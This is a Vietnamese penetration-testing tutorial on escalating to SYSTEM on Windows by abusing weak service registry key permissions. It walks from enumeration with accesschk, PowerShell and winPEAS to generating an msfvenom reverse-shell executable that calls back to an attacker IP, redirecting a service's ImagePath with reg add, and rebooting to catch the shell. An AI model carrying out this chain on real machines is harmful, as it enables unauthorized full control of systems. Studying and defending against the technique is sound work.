# Liệt kê các Weak Registry Key Permissions

Khi liệt kê các quyền của khóa đăng ký yếu, mục tiêu của tôi là tìm các quyền yếu trên subkeys trong HKLM\SYSTEM\CurrentControlSet\Services registry key. Đây là registry key được liên kết với tất cả các dịch vụ có trên hệ thống

# Săn lùng các quyền của khóa đăng ký yếu: accesschk.exe(Thuộc bộ công cụ Sysinterals)

Link tải: https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
sau khi tải xuống ta có 2 bản là bản 64 và 32 bit

Để biết máy nạn nhân sử dụng hệ điều hành nào ta dùng câu lệnh:
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"

các quyền của người dùng nên quan tâm như :

- Người dùng cụ thể mà tôi hiện đang đăng nhập với tên (%USERNAME%)
- Authenticated Users
- Everyone
- BUILTIN\Users
- NT AUTHORITY\INTERACTIVE

Khi sử dụng accesschk, trước tiên tôi muốn kiểm tra người dùng hiện tại của mình vì người dùng hiện tại của tôi có thể sẽ thuộc hầu hết nếu không phải tất cả các nhóm đó theo mặc định. Điều này có thể giúp loại bỏ công việc phỏng đoán khi cố gắng tìm xem quyền của nhóm nào đã được đặt cho khóa đăng ký mà tôi đang truy vấn.

```
accesschk64.exe "%USERNAME%" -kvuqsw hklm\System\CurrentControlSet\services -accepteula
```

Kết quả cho thấy người dùng hiện tại của tôi có ALL_ACCESS đối với khóa đăng ký. Điều này có nghĩa là các quyền trên khóa đăng ký được đặt thành Kiểm soát hoàn toàn cho người dùng này cụ thể hoặc một trong các nhóm mà người dùng đó thuộc về.

Ngoài ra, chúng ta có thể truy vấn bất kỳ nhóm nào bằng cách thay thế giá trị trong dấu ngoặc kép từ dấu phẩy trên:

```
accesschk64.exe "Everyone" -kqswvu hklm\System\CurrentControlSet\services -accepteula

accesschk64.exe "Authenticated Users" -kqswvu hklm\System\CurrentControlSet\services -accepteula

accesschk64.exe "BUILTIN\Users" -kqswvu hklm\System\CurrentControlSet\services -accepteula

accesschk64.exe "NT AUTHORITY\INTERACTIVE" -kqswvu hklm\System\CurrentControlSet\services -accepteula

```

# Săn lùng các quyền khóa đăng ký yếu: PowerShell + Linux-Fu

Để tìm kiếm các quyền của khóa đăng ký dịch vụ yếu là sử dụng PowerShell để trích xuất thông tin từ tất cả các khóa con trong khóa đăng ký HKLM\SYSTEM\CurrentControlSet\Services bằng câu lệnh:

```
Get-Acl -Path hklm:\System\CurrentControlSet\services\* | Format-List | Out-File -FilePath C:\temp\service_keys.txt
```

Sau đó tao download file về. Vì tệp này rất lớn nên tôi sẽ cần thực hiện một số Linux-fu để cắt giảm đầu ra xuống chỉ còn những thông tin thú vị để tôi có thể phát hiện ra ngoại lệ của mình dễ dàng hơn.

```
cat service_keys.txt | grep -i "Path\|Access\|BUILTIN\\\Users\|Everyone\|INTERACTIVE\|Authenticated Users" | grep -v "ReadKey" | grep -B 1 -i "Authenticated Users|\BUILTIN\\\Users\|Everyone\|INTERACTIVE\|FullControl\|Modify\|Write"
```

Chúng ta có thể kiểm chứng trên máy nạn nhân sau khi tìm được bằng câu lệnh

```
Get-Acl -Path hklm:\System\CurrentControlSet\services\Juggernaut | Format-List
```

# Săn lùng các quyền của khóa đăng ký yếu: winPEAS.exe

Có lẽ cách dễ nhất để tìm kiếm các quyền khóa đăng ký dịch vụ yếu là sử dụng tập lệnh liệt kê leo thang đặc quyền cuối cùng: winPEAS.exe
Tải bản sao winPEASx64.exe xuống nạn nhân.

Sau khi thực thi winPEAS, tôi sẽ tìm thấy mọi khóa đăng ký dịch vụ bị định cấu hình sai trong phần Thông tin dịch vụ .

Sau khi đã tìm được khóa ta bằng đầu khai thác

Liệt kê khóa đăng ký dịch vụ yếu mà tôi tìm thấy

Sau khi tìm thấy một khóa đăng ký dịch vụ thú vị có quyền yếu, tôi cần thu thập thông tin về dịch vụ và tệp thực thi mà nó trỏ tới.
Chúng ta có thể liệt kê dịch vụ trực tiếp bằng lệnh cmd.exe hoặc PowerShell.
Sử dụng cmd.exe:

```
reg query "HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Juggernaut"
```

Sử dụng PowerShell:

```
Get-Item -Path Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Juggernaut
```

Ta có thể thấy rằng “ImagePath” trỏ đến C:\Program Files\Juggernaut\Juggernaut.exe , đây là dịch vụ thực thi được chạy khi dịch vụ được khởi động.
Chúng ta cũng có thể thấy dịch vụ đó thực thi dưới dạng LocalSystem (SYSTEM) và có giá trị bắt đầu là 2, có nghĩa là “Tự động khởi động”.
Nếu tôi cố gắng liệt kê các quyền trên thư mục C:\Program Files\Juggernaut hoặc tệp Juggernaut.exe, tôi có thể sẽ thấy rằng tôi không có quyền thay thế tệp nhị phân bằng tệp độc hại.

```
icacls "C:\Program Files\Juggernaut\Juggernaut.exe"
icacls "C:\Program Files\Juggernaut"
```

Từ kết quả đầu ra, ta có thể thấy rằng nhóm được liệt kê duy nhất mà người dùng hiện tại của chúng ta thuộc về là nhóm BUILTIN\Users, không có (F), (M) hoặc (W) bên cạnh. Điều này có nghĩa là tôi không thể giả mạo tệp từ ImagePath gốc.

Vì tôi có quyền sửa đổi khóa đăng ký nên tôi có thể thay đổi ImagePath để trỏ đến tệp mà tôi có quyền kiểm soát.

Do dịch vụ này tự động khởi động nên tôi sẽ cần kích hoạt một sự kiện để khởi động lại dịch vụ hoặc cố gắng dừng rồi khởi động lại. Thật may mắn cho tôi, trước đó tôi đã thấy rằng người dùng chuẩn của tôi có SeShutdownPrivilege, nghĩa là tôi có thể khởi động lại hệ thống để buộc dịch vụ khởi động lại.

Khai thác khóa đăng ký dịch vụ yếu mà tôi tìm thấy

Tạo một tệp thực thi độc hại

Để khai thác điều này, tất cả những gì chúng ta cần làm là tạo một tệp thực thi độc hại, chuyển nó cho nạn nhân, chỉnh sửa ImagePath của khóa đăng ký, khởi động lại dịch vụ và sau đó chúng ta sẽ nhận được shell HỆ THỐNG. Vì vậy, hãy bắt đầu bằng việc tạo ra tệp thực thi của chúng ta.
Trong ví dụ này, tôi sẽ sử dụng msfvenom để tạo tệp thực thi độc hại của mình.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --platform Windows -f exe -o pwnt.exe
```

Khi tệp thực thi đã sẵn sàng hoạt động, tôi cần chuyển nó sang máy nạn nhân. Vì chia sẻ vẫn đang mở nên hãy sử dụng nó.

Khai thác Khóa đăng ký dịch vụ yếu để lấy SYSTEM Shell

Có tệp thực thi độc hại trên máy chủ nạn nhân, tôi sẵn sàng thực hiện cuộc tấn công của mình và nâng cấp lên trình bao SYSYEM.
Điều đầu tiên chúng ta cần làm là thay đổi ImagePath trên khóa đăng ký dịch vụ Juggernaut để trỏ đến tệp thực thi độc hại của chúng ta. Chúng ta có thể làm điều này bằng lệnh sau:

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Juggernaut" /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\pwnt.exe" /f
```

Sau khi sửa đổi thành công ImagePath để trỏ đến tệp thực thi độc hại của tôi, tôi cần quay lại máy tấn công của mình và thiết lập trình nghe netcat trên cổng 443.
Với mọi thứ đã sẵn sàng, việc còn lại chỉ là khởi động lại máy.

```
shutdown /r /t 0
```

Máy khởi động lại và lớp vỏ ban đầu của tôi bị cắt ra; tuy nhiên, sau khoảng 20 giây, shell HỆ THỐNG sẽ xuất hiện trên trình nghe của tôi!
